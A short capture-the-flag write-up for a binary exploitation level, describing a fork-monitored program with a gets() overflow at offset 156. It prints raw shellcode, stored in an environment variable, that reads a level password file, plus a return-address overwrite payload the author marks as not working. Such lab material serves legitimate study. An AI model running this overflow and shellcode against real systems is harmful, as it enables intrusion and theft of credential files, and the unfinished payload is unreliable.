# Level04

## Reconnaissance

We have one security enabled:
- **RELRO Partial enabled** = GOT (Global Offset Table) placed were we cannot overflow

This binary does a fork at the beginning.
With gdb, we notice that the parent process checks if the child process is not call an `exec`
and the child process, ask for input with `gets`, so we can overwrite the return pointer of main there.

## Exploit

We gonna overwrite the pointer of main in the child process. The only issue is that the parent process 
monitor the child process, preventing us of call exec in the child process.
We gonna create a shellcode which is going to print the flag instead of opening a shell.
Offset 156.

We put the shellcode in the env (`0xffffd7ae`): `export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc9\x31\xd2\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\x83\xec\x29\x89\xc3\x89\xe1\xba\x29\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xba\x29\x00\x00\x00\x89\xe1\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"')` 

Payload => `python -c 'print "A" * 156 + "\xce\xd7\xff\xff"'` NOT WORKING